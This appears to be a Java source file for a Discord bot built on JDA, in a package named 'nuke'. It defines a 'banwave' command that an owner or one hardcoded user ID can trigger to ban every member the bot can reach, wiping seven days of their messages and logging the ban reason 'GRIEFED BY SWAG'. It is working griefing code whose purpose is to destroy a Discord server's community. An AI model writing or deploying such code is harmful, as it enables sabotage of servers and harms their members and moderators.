package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import me.comu.exeter.logging.Logger;
import me.comu.exeter.wrapper.Wrapper;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.exceptions.HierarchyException;

import java.util.Arrays;
import java.util.List;

public class BanwaveCommand implements ICommand {

    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("210956619788320768")) {
            return;
        }
        Logger.getLogger().print("Initiating Ban Wave...");
//        event.getGuild().getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member))).forEach(member -> member.ban(7, "GRIEFED BY SWAG").queue());

        for (Member member : event.getGuild().getMembers()) {
                if (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member)) {
                    event.getGuild().ban(member, 7).reason("GRIEFED BY SWAG").queue();
                 Logger.getLogger().print("Banned " + member.getUser().getName() + "#" + member.getUser().getDiscriminator());
            }
    }

}


    @Override
    public String getHelp() {
        return "Use at your own risk\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "etb";
    }

    @Override
    public String[] getAlias() {
        return new String[] {"bw","banwave"};
    }

     @Override
    public Category getCategory() {
        return Category.OWNER;
    }
}

